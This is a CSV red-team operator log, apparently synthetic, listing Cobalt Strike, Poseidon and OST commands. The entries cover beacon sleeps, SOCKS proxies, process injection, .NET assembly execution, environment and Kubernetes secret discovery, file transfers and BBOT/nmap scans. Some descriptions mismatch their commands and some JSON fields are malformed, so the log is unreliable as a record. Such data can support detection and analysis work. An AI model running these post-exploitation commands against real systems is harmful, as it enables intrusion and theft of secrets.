entry_identifier,start_date,end_date,source_ip,dest_ip,tool,user_context,command,description,output,comments,operator_name,extra_fields,oplog_id,tags
126,2023-11-15 10:40:01,2023-12-03 15:03:47,35.14.5.27,66.1.255.186,OST,afranklin@harrison.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Failed,Using BBOT safe and passive modules,Jerry Gonzalez,,,
127,2024-06-06 02:15:47,2024-06-06 02:15:47.803281,116.163.112.137,149.55.234.226,Cobalt Strike,ipena@lane.com,execute-assembly /pick/occur.exe,PID 10850,Failed,Running a local .NET executable,Jerry Gonzalez,,,
128,2023-10-17 07:31:47,2024-02-09 02:04:09,90.201.27.188,66.1.255.186,Cobalt Strike,afranklin@harrison.com,upload /first/so.html,PID 20381,Failed,Attempting a file upload,Manuel Chase,,,
129,2023-12-03 17:58:27,2024-02-15 14:57:02,116.163.112.137,55.167.201.151,Poseidon,alopez@dawson.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Jerry Gonzalez,,,
130,2023-12-01 23:09:02,2023-12-24 08:27:15,90.201.27.188,149.55.234.226,Poseidon,afranklin@harrison.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Success,Attempting to start a SOCKS proxy,Manuel Chase,,,
131,2023-12-19 20:19:35,2024-03-26 15:36:13,116.163.112.137,66.1.255.186,OST,ipena@lane.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Alexander Kim,,,
132,2024-03-23 00:12:19,2024-05-07 13:31:45,116.163.112.137,55.167.201.151,Cobalt Strike,ipena@lane.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Jerry Gonzalez,,,
133,2023-10-30 13:39:47,2023-11-14 12:25:48,148.64.118.11,55.167.201.151,OST,alopez@dawson.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Success,Navigating to a directory,Jerry Gonzalez,,,
134,2023-10-10 19:46:07,2024-02-24 12:29:19,148.64.118.11,55.167.201.151,Poseidon,alopez@dawson.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Failed,Attempting to upload a file,Alexander Kim,,,
135,2024-04-09 21:04:22,2024-04-21 07:37:56,35.14.5.27,66.1.255.186,Poseidon,alopez@dawson.com,pty whoami,"PID 31096, Callback 44",Success,Obtaining user context,Jerry Gonzalez,,,
136,2024-03-28 02:35:17,2024-03-28 03:01:20,116.163.112.137,55.167.201.151,OST,alopez@dawson.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Jerry Gonzalez,,,
137,2024-04-16 09:11:05,2024-05-05 17:55:38,35.14.5.27,66.1.255.186,OST,ipena@lane.com,ls,PID: 13028,Failed,Listing files and directories,Manuel Chase,,,
138,2023-10-16 05:07:12,2023-10-22 14:49:51,35.14.5.27,149.55.234.226,OST,afranklin@harrison.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Failed,Navigating to a directory,Alexander Kim,,,
139,2023-12-22 16:38:58,2024-01-12 20:37:49,148.64.118.11,55.167.201.151,OST,ipena@lane.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Manuel Chase,,,
140,2024-04-21 00:03:03,2024-04-30 20:33:54,35.14.5.27,149.55.234.226,Poseidon,ipena@lane.com,pty whoami,"PID 31096, Callback 44",Success,Obtaining user context,Manuel Chase,,,
141,2023-07-31 18:12:06,2024-05-09 19:38:39,90.201.27.188,66.1.255.186,Poseidon,alopez@dawson.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Alexander Kim,,,
142,2024-05-05 01:01:56,2024-05-09 22:48:56,148.64.118.11,149.55.234.226,Poseidon,afranklin@harrison.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Jerry Gonzalez,,,
143,2024-03-12 04:05:17,2024-05-04 20:16:36,148.64.118.11,55.167.201.151,Poseidon,afranklin@harrison.com,sleep 19,"PID 2266, Callback 86",Success,Sleeping a beacon,Manuel Chase,,,
144,2023-09-19 03:41:16,2023-11-03 18:52:32,148.64.118.11,66.1.255.186,Cobalt Strike,ipena@lane.com,sleep 7,PID 3213,Failed,Sleeping a beacon,Jerry Gonzalez,,,
145,2023-10-13 04:40:42,2023-11-15 21:35:29,35.14.5.27,55.167.201.151,OST,afranklin@harrison.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Success,Using BBOT safe and passive modules,Alexander Kim,,,
146,2023-11-07 09:17:52,2024-03-07 20:06:44,90.201.27.188,66.1.255.186,OST,afranklin@harrison.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Alexander Kim,,,
147,2024-01-14 00:53:23,2024-03-19 16:09:44,116.163.112.137,149.55.234.226,Poseidon,alopez@dawson.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Alexander Kim,,,
148,2023-12-29 19:12:26,2024-02-11 10:24:02,90.201.27.188,66.1.255.186,OST,alopez@dawson.com,ls,PID: 13028,Failed,Listing files and directories,Manuel Chase,,,
149,2024-05-27 15:10:10,2024-05-27 15:10:10.778073,35.14.5.27,55.167.201.151,Cobalt Strike,afranklin@harrison.com,cd /policy/fear/yourself,PID 14828,Failed,Navigating to a directory,Alexander Kim,,,
150,2024-03-25 13:08:24,2024-04-14 21:49:10,35.14.5.27,55.167.201.151,Cobalt Strike,alopez@dawson.com,sleep 7,PID 3213,Success,Sleeping a beacon,Alexander Kim,,,
151,2024-06-30 08:46:46,2024-06-30 08:46:46.698728,35.14.5.27,55.167.201.151,OST,afranklin@harrison.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Manuel Chase,,,
152,2024-01-26 03:54:49,2024-04-06 13:21:20,116.163.112.137,149.55.234.226,OST,alopez@dawson.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Jerry Gonzalez,,,
153,2023-12-26 09:26:27,2024-03-29 15:01:59,116.163.112.137,55.167.201.151,OST,ipena@lane.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Jerry Gonzalez,,,
154,2023-08-06 12:45:56,2023-10-08 14:54:56,35.14.5.27,149.55.234.226,Poseidon,afranklin@harrison.com,pty ./kubectl get namespaces -n cluster,"PID 29432, Callback 20",Success,Conducting container discovery,Manuel Chase,,,
155,2024-04-14 05:58:35,2024-05-02 13:52:00,35.14.5.27,149.55.234.226,Cobalt Strike,alopez@dawson.com,sleep 7,PID 3213,Success,Sleeping a beacon,Alexander Kim,,,
156,2023-12-01 12:55:26,2024-03-12 22:36:09,116.163.112.137,149.55.234.226,OST,alopez@dawson.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Jerry Gonzalez,,,
157,2023-12-14 16:58:12,2023-12-30 16:34:29,35.14.5.27,66.1.255.186,Cobalt Strike,afranklin@harrison.com,cd /policy/fear/yourself,PID 14828,Failed,Navigating to a directory,Alexander Kim,,,
158,2023-09-18 04:59:56,2024-03-12 19:34:32,116.163.112.137,55.167.201.151,OST,alopez@dawson.com,sleep 3,PID: 8087,Success,Sleeping a beacon,Manuel Chase,,,
159,2024-05-12 17:23:24,2024-05-12 17:23:24.531887,116.163.112.137,66.1.255.186,Poseidon,afranklin@harrison.com,getenv,"PID 18369, Callback 13",Success,Attempting to get environment variables,Alexander Kim,,,
160,2024-04-24 07:59:54,2024-04-28 10:36:32,148.64.118.11,66.1.255.186,Poseidon,alopez@dawson.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Failed,Attempting to upload a file,Alexander Kim,,,
161,2024-01-12 07:44:49,2024-04-13 07:41:00,35.14.5.27,55.167.201.151,Poseidon,afranklin@harrison.com,sleep 19,"PID 2266, Callback 86",Failed,Sleeping a beacon,Jerry Gonzalez,,,
162,2023-08-29 22:23:42,2024-04-24 08:15:39,90.201.27.188,55.167.201.151,Poseidon,ipena@lane.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Success,Attempting to start a SOCKS proxy,Manuel Chase,,,
163,2023-10-04 02:33:48,2023-12-26 06:22:55,116.163.112.137,55.167.201.151,Poseidon,alopez@dawson.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Failed,Attempting to upload a file,Jerry Gonzalez,,,
164,2023-11-30 19:16:30,2023-12-20 23:31:58,90.201.27.188,66.1.255.186,Poseidon,afranklin@harrison.com,pty kubectl get namespaces,"PID 4839, Callback 49",Failed,Conducting container discovery,Jerry Gonzalez,,,
165,2023-12-24 16:42:24,2024-03-16 15:13:05,35.14.5.27,55.167.201.151,OST,alopez@dawson.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Manuel Chase,,,
166,2023-12-22 03:58:19,2024-01-08 01:06:06,35.14.5.27,55.167.201.151,Poseidon,alopez@dawson.com,getenv,"PID 18369, Callback 13",Failed,Attempting to get environment variables,Manuel Chase,,,
167,2024-02-10 02:48:20,2024-04-19 13:28:58,148.64.118.11,55.167.201.151,OST,ipena@lane.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Failed,Using BBOT safe and passive modules,Manuel Chase,,,
168,2024-04-12 04:45:42,2024-04-27 18:03:23,116.163.112.137,66.1.255.186,Poseidon,ipena@lane.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Manuel Chase,,,
169,2023-11-15 13:30:41,2024-03-20 02:04:39,148.64.118.11,149.55.234.226,Poseidon,alopez@dawson.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Failed,Attempting to upload a file,Alexander Kim,,,
170,2023-08-24 16:37:16,2024-01-02 15:49:07,116.163.112.137,149.55.234.226,Poseidon,alopez@dawson.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Alexander Kim,,,
171,2023-09-26 21:22:23,2023-10-23 20:57:50,148.64.118.11,55.167.201.151,Poseidon,alopez@dawson.com,getenv,"PID 18369, Callback 13",Failed,Attempting to get environment variables,Jerry Gonzalez,,,
172,2023-12-11 19:43:43,2024-04-01 13:34:49,35.14.5.27,66.1.255.186,OST,alopez@dawson.com,ls,PID: 13028,Success,Listing files and directories,Jerry Gonzalez,,,
173,2024-06-19 00:56:42,2024-06-19 00:56:42.131366,116.163.112.137,55.167.201.151,OST,ipena@lane.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Manuel Chase,,,
174,2023-11-06 09:05:56,2024-03-10 18:56:06,90.201.27.188,55.167.201.151,Poseidon,ipena@lane.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Jerry Gonzalez,,,
175,2024-01-17 18:10:28,2024-02-02 02:17:49,35.14.5.27,66.1.255.186,Poseidon,afranklin@harrison.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Manuel Chase,,,
176,2023-11-15 09:43:55,2023-12-07 04:49:03,35.14.5.27,66.1.255.186,Cobalt Strike,afranklin@harrison.com,execute-assembly /pick/occur.exe,PID 10850,Failed,Running a local .NET executable,Alexander Kim,,,
177,2023-11-12 15:47:27,2024-01-19 07:59:54,148.64.118.11,66.1.255.186,OST,ipena@lane.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Jerry Gonzalez,,,
178,2024-01-05 02:15:36,2024-03-26 17:56:48,35.14.5.27,66.1.255.186,Poseidon,ipena@lane.com,pty ./kubectl get pods,"PID 2804, Callback 6",Success,Conducting container discovery,Jerry Gonzalez,,,
179,2023-10-28 17:09:12,2023-11-30 09:34:42,116.163.112.137,55.167.201.151,Cobalt Strike,alopez@dawson.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Failed,Selecting executable for post-exploitation jobs,Alexander Kim,,,
180,2024-04-28 02:48:33,2024-05-06 03:20:25,35.14.5.27,55.167.201.151,Cobalt Strike,afranklin@harrison.com,pwd,PID 18794,Failed,Obtaining current working directory,Jerry Gonzalez,,,
181,2023-07-31 16:57:05,2023-12-30 14:39:47,116.163.112.137,66.1.255.186,Poseidon,ipena@lane.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Failed,Attempting to upload a file,Alexander Kim,,,
182,2023-08-08 01:27:58,2024-01-27 02:12:45,148.64.118.11,66.1.255.186,Cobalt Strike,alopez@dawson.com,inject-assembly 10023 /during/window.exe,PID 29523,Success,Injecting assembly into a process,Alexander Kim,,,
183,2023-11-22 02:37:48,2023-12-15 04:44:21,35.14.5.27,66.1.255.186,Poseidon,ipena@lane.com,pty kubectl get namespaces,"PID 4839, Callback 49",Success,Conducting container discovery,Jerry Gonzalez,,,
184,2023-12-07 17:00:38,2024-03-25 04:12:41,35.14.5.27,149.55.234.226,OST,afranklin@harrison.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Success,Navigating to a directory,Alexander Kim,,,
185,2023-09-26 00:44:29,2024-03-29 01:05:42,116.163.112.137,149.55.234.226,OST,afranklin@harrison.com,ls,PID: 13028,Success,Listing files and directories,Manuel Chase,,,
186,2024-05-23 07:25:26,2024-05-23 07:25:26.798731,116.163.112.137,149.55.234.226,OST,ipena@lane.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Manuel Chase,,,
187,2024-01-04 20:11:32,2024-02-27 16:25:36,35.14.5.27,149.55.234.226,Poseidon,alopez@dawson.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Jerry Gonzalez,,,
188,2024-01-14 06:37:58,2024-05-02 16:51:39,35.14.5.27,149.55.234.226,Cobalt Strike,afranklin@harrison.com,shinject 12473 x64 /growth.bin,PID 31000,Failed,Attempting process injection,Manuel Chase,,,
189,2023-11-14 04:52:06,2024-02-29 08:41:52,90.201.27.188,66.1.255.186,Cobalt Strike,alopez@dawson.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Failed,Selecting executable for post-exploitation jobs,Manuel Chase,,,
190,2023-09-12 09:50:08,2024-04-09 22:45:46,90.201.27.188,55.167.201.151,Poseidon,alopez@dawson.com,pty kubectl get namespaces,"PID 4839, Callback 49",Failed,Conducting container discovery,Alexander Kim,,,
191,2024-06-29 18:44:57,2024-06-29 18:44:57.264533,116.163.112.137,55.167.201.151,Poseidon,afranklin@harrison.com,pty ./kubectl get pods,"PID 2804, Callback 6",Failed,Conducting container discovery,Alexander Kim,,,
192,2024-05-06 12:09:30,2024-05-07 12:00:21,90.201.27.188,55.167.201.151,OST,ipena@lane.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Success,Navigating to a directory,Alexander Kim,,,
193,2023-12-06 11:30:42,2024-02-06 15:16:45,90.201.27.188,149.55.234.226,Poseidon,afranklin@harrison.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Success,Conducting container discovery,Manuel Chase,,,
194,2023-08-11 21:02:07,2023-11-23 03:19:55,35.14.5.27,55.167.201.151,Cobalt Strike,afranklin@harrison.com,inject-assembly 10023 /during/window.exe,PID 29523,Failed,Injecting assembly into a process,Alexander Kim,,,
195,2024-01-18 06:41:00,2024-03-22 01:05:12,148.64.118.11,149.55.234.226,OST,afranklin@harrison.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Failed,Navigating to a directory,Jerry Gonzalez,,,
196,2024-02-04 11:54:02,2024-02-15 04:38:31,90.201.27.188,55.167.201.151,Cobalt Strike,afranklin@harrison.com,upload /first/so.html,PID 20381,Failed,Attempting a file upload,Manuel Chase,,,
197,2023-08-25 19:22:55,2024-01-06 18:37:09,148.64.118.11,66.1.255.186,Poseidon,alopez@dawson.com,sleep 19,"PID 2266, Callback 86",Success,Sleeping a beacon,Alexander Kim,,,
198,2024-02-27 13:29:52,2024-03-21 15:49:55,116.163.112.137,66.1.255.186,Poseidon,alopez@dawson.com,sleep 19,"PID 2266, Callback 86",Failed,Sleeping a beacon,Alexander Kim,,,
199,2024-01-16 07:32:22,2024-04-24 04:20:42,148.64.118.11,66.1.255.186,Poseidon,afranklin@harrison.com,sleep 19,"PID 2266, Callback 86",Failed,Sleeping a beacon,Jerry Gonzalez,,,
200,2024-03-23 02:02:58,2024-04-06 18:22:15,35.14.5.27,66.1.255.186,OST,alopez@dawson.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Failed,Navigating to a directory,Jerry Gonzalez,,,
201,2024-04-26 14:34:41,2024-05-01 00:41:30,90.201.27.188,55.167.201.151,Poseidon,alopez@dawson.com,sleep 19,"PID 2266, Callback 86",Success,Sleeping a beacon,Manuel Chase,,,
202,2023-12-14 08:13:25,2024-03-24 18:32:12,90.201.27.188,55.167.201.151,Poseidon,ipena@lane.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Success,Attempting to start a SOCKS proxy,Jerry Gonzalez,,,
203,2023-10-04 20:06:54,2023-11-30 22:12:05,148.64.118.11,149.55.234.226,Cobalt Strike,ipena@lane.com,execute-assembly /pick/occur.exe,PID 10850,Success,Running a local .NET executable,Manuel Chase,,,
204,2024-03-25 03:26:55,2024-04-05 03:47:34,90.201.27.188,149.55.234.226,OST,afranklin@harrison.com,bbot -t stephens.com-m nmap,PID: 22204,Failed,Using BBOT port scan,Jerry Gonzalez,,,
205,2024-01-10 18:26:32,2024-01-24 11:04:05,116.163.112.137,66.1.255.186,Cobalt Strike,ipena@lane.com,spawn x64 HTTPS,PID 2061,Failed,Spawning a new beacon,Jerry Gonzalez,,,
206,2023-07-29 06:55:14,2023-11-11 14:20:26,116.163.112.137,149.55.234.226,Poseidon,alopez@dawson.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Manuel Chase,,,
207,2023-10-25 11:07:26,2023-12-29 21:02:12,148.64.118.11,149.55.234.226,Cobalt Strike,alopez@dawson.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Failed,Selecting executable for post-exploitation jobs,Jerry Gonzalez,,,
208,2024-02-28 22:16:54,2024-04-14 08:17:26,90.201.27.188,149.55.234.226,Poseidon,afranklin@harrison.com,pty ./kubectl get pods,"PID 2804, Callback 6",Success,Conducting container discovery,Alexander Kim,,,
209,2024-06-05 07:55:57,2024-06-05 07:55:57.329526,148.64.118.11,55.167.201.151,Poseidon,ipena@lane.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Success,Conducting container discovery,Jerry Gonzalez,,,
210,2023-10-11 10:40:13,2024-04-16 15:42:33,35.14.5.27,66.1.255.186,Poseidon,afranklin@harrison.com,pty whoami,"PID 31096, Callback 44",Failed,Obtaining user context,Manuel Chase,,,
211,2023-08-02 16:09:21,2024-03-25 14:50:17,116.163.112.137,66.1.255.186,Cobalt Strike,ipena@lane.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Jerry Gonzalez,,,
212,2024-04-23 16:45:16,2024-05-02 22:36:37,116.163.112.137,149.55.234.226,Poseidon,ipena@lane.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Failed,Attempting to upload a file,Alexander Kim,,,
213,2024-06-19 11:17:48,2024-06-19 11:17:48.833737,35.14.5.27,66.1.255.186,Poseidon,ipena@lane.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Success,Attempting to upload a file,Jerry Gonzalez,,,
214,2024-04-08 15:00:59,2024-04-29 17:27:26,90.201.27.188,55.167.201.151,OST,ipena@lane.com,ls,PID: 13028,Success,Listing files and directories,Jerry Gonzalez,,,
215,2024-06-25 07:34:13,2024-06-25 07:34:13.863773,116.163.112.137,66.1.255.186,OST,ipena@lane.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Failed,Navigating to a directory,Manuel Chase,,,
216,2024-06-22 08:00:40,2024-06-22 08:00:40.217615,148.64.118.11,55.167.201.151,Poseidon,alopez@dawson.com,sleep 19,"PID 2266, Callback 86",Success,Sleeping a beacon,Manuel Chase,,,
217,2024-05-19 06:41:03,2024-05-19 06:41:03.020377,148.64.118.11,55.167.201.151,Poseidon,alopez@dawson.com,sleep 19,"PID 2266, Callback 86",Success,Sleeping a beacon,Alexander Kim,,,
218,2024-03-11 17:39:50,2024-05-08 03:36:25,148.64.118.11,149.55.234.226,OST,ipena@lane.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Alexander Kim,,,
219,2023-09-09 06:41:16,2024-03-15 14:58:42,116.163.112.137,149.55.234.226,Poseidon,ipena@lane.com,pty ./kubectl get pods,"PID 2804, Callback 6",Failed,Conducting container discovery,Alexander Kim,,,
220,2023-10-08 23:22:40,2023-10-18 14:57:49,148.64.118.11,66.1.255.186,Cobalt Strike,ipena@lane.com,upload /first/so.html,PID 20381,Failed,Attempting a file upload,Manuel Chase,,,
221,2024-05-07 03:06:28,2024-05-08 00:16:51,90.201.27.188,149.55.234.226,OST,ipena@lane.com,bbot -t stephens.com-m nmap,PID: 22204,Failed,Using BBOT port scan,Alexander Kim,,,
222,2024-04-25 21:48:04,2024-04-26 03:45:46,35.14.5.27,55.167.201.151,Poseidon,afranklin@harrison.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Success,Conducting container discovery,Jerry Gonzalez,,,
223,2024-06-16 11:59:10,2024-06-16 11:59:10.624590,90.201.27.188,149.55.234.226,Cobalt Strike,ipena@lane.com,sleep 7,PID 3213,Success,Sleeping a beacon,Alexander Kim,,,
224,2024-01-12 16:53:27,2024-03-25 04:56:48,35.14.5.27,66.1.255.186,OST,afranklin@harrison.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Success,Navigating to a directory,Alexander Kim,,,
225,2024-02-25 23:50:28,2024-03-14 15:04:16,35.14.5.27,149.55.234.226,OST,afranklin@harrison.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Alexander Kim,,,
226,2023-12-24 05:14:11,2024-04-10 11:10:45,116.163.112.137,55.167.201.151,Poseidon,afranklin@harrison.com,pty ./kubectl get pods,"PID 2804, Callback 6",Success,Conducting container discovery,Jerry Gonzalez,,,
